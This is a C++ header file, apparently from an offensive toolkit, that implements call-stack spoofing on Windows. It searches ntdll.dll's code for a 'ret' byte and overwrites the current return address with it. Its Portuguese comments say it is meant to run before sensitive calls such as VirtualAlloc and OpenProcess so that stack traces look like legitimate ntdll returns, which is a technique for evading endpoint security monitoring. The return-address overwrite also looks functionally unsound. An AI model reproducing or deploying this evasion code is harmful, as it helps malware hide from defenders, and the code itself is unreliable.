#pragma once
#include <windows.h>
#include <winternl.h>

namespace StackSpoof {

    static uintptr_t FindRetGadget() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        auto* base    = reinterpret_cast<BYTE*>(ntdll);
        auto* dos     = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
        auto* nt      = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
        auto* sec     = IMAGE_FIRST_SECTION(nt);

        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            if (sec[i].Characteristics & IMAGE_SCN_CNT_CODE) {
                auto* start = base + sec[i].VirtualAddress;
                auto  size  = sec[i].Misc.VirtualSize;
                for (DWORD j = 0; j < size; ++j) {
                    if (start[j] == 0xC3)
                        return reinterpret_cast<uintptr_t>(start + j);
                }
            }
        }
        return 0;
    }

    static uintptr_t g_RetGadget = 0;

    inline void Init() {
        g_RetGadget = FindRetGadget();
    }

    // Chama antes de qualquer função sensível (VirtualAlloc, OpenProcess, etc.)
    // Stack trace vai parecer retorno legítimo do ntdll
    __forceinline void SpoofReturnAddress() {
        if (!g_RetGadget) return;
        volatile uintptr_t* rsp =
            reinterpret_cast<volatile uintptr_t*>(_AddressOfReturnAddress());
        *rsp = g_RetGadget;
    }

} // namespace StackSpoof
